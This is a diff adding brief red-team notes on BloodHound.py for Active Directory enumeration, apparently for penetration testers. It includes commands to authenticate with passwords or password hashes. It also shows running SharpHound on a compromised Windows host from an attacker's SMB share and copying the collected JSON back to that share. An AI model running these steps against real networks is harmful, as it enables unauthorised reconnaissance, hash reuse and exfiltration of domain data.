@@ -1,0 +1,27 @@
+## bloodhound.py - a Python based ingestor for BloodHound.
+https://github.com/fox-it/BloodHound.py
+
+# Enter the BloodHound.py folder and install Bloodhound.
+
+cd BloodHound.py
+python setup.py install
+
+# Option.1 Extract domain information using password 
+
+python3 ./BloodHound.py/bloodhound.py -u <username> -p <password> -d <domain>
+
+# Option.2 Extract domain information using password hashes
+
+python3 ./BloodHound.py/bloodhound.py -u <username> --hashes <LM:NLTM> -d <domain>
+
+# Option.3 Run the SharpHound executable from the Kali share on a compromised Windows host.
+
+Kali root# smbserver.py -smb2support test .
+
+Windows C:\> \\kali-ip\test\SharpHound.exe
+Windows C:\> copy *.json \\kali-ip\test\*.json  
+
+# After the domain information has been extracted, you can import the JSON files into your BloodHound instance graph.
+
+# For addtional Bloodhound queries, make a backup of the 'BloodHound-linux-x64/resources/app/src/components/SearchContainer/Tabs/PrebuiltQueries.json' file and drop the 'PrebuiltQueries.json'file in that directory.
+
